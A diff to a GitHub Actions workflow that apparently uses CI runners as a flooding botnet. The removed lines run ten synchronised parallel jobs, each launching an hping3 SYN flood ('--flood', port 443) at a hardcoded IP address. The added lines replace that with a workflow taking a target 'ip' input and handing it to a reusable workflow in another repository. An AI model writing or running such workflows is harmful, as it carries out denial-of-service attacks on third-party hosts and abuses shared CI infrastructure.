@@ -1,35 +1,13 @@
-name: 并发
-
 on:
-  # push:
   workflow_dispatch:
-
-concurrency:
-  group: ${{ github.workflow }}-${{ github.ref }}
-  cancel-in-progress: true
-
-env:
-  TZ: Asia/Shanghai
+    inputs:
+      ip:
+        required: true
+        default: '0.0.0.0'
+        type: string
 
 jobs:
-  concurrent-jobs:
-    runs-on: ubuntu-latest
-    strategy:
-      # max-parallel: 5
-      fail-fast: false
-      matrix:
-        # job_id: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30]
-        # job_id: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
-        job_id: [1,2,3,4,5,6,7,8,9,10]
-    steps:
-      - uses: actions/checkout@v4
-      - name: Step 1
-        run: |
-          sudo apt install hping3 -q
-          yarn
-          yarn build && timeout 20s node dist/distributed_barrier.js
-
-      - name: Step 2
-        run: |
-          date "+%Y-%m-%d %H:%M:%S"
-          sudo timeout 60s hping3 -S --flood -V -d 1400 -p 443 -s 1000-65535 47.76.85.88 || true
+  job:
+    uses: mirllan2025/express/.github/workflows/main.yml@master
+    with:
+      ip: ${{inputs.ip}}
